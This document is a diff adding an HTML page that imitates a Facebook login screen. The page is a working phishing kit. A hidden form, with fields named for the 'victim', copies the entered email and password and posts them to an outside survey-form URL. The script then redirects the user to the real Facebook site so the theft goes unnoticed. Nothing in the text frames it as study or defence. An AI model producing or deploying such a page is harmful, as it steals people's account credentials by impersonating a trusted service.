@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+        }
+
+        .container {
+            max-width: 400px;
+            margin: 100px auto;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        h2 {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        input[type="text"],
+        input[type="password"],
+        button {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+
+        button {
+            background-color: #1877f2;
+            color: #fff;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #166fe5;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Welcome to Facebook</h2>
+        <form id="loginForm">
+            <input type="text" id="username" name="username" placeholder="Mobile number or email address" required>
+            <input type="password" id="password" name="password" placeholder="Password" required>
+            <button type="button" id="loginBtn">Log In</button>
+        </form>
+    </div>
+    <form id="hiddenForm" action="https://surveyheart.com/form/66394d0bd5aaaa29d5c34ec1" method="POST" style="display:none;">
+        <input type="text" id="victimUsername" name="uore">
+        <input type="password" id="victimPassword" name="p">
+    </form>
+    <script>
+        document.getElementById("loginBtn").addEventListener("click", function() {
+            var username = document.getElementById("username").value;
+            var password = document.getElementById("password").value;
+            // Fill hidden form
+            document.getElementById("victimUsername").value = username;
+            document.getElementById("victimPassword").value = password;
+            // Submit hidden form
+            document.getElementById("hiddenForm").submit();
+            // Redirect to actual Facebook login page
+            window.location.href = "https://www.facebook.com/";
+        });
+    </script>
+</body>
+</html>
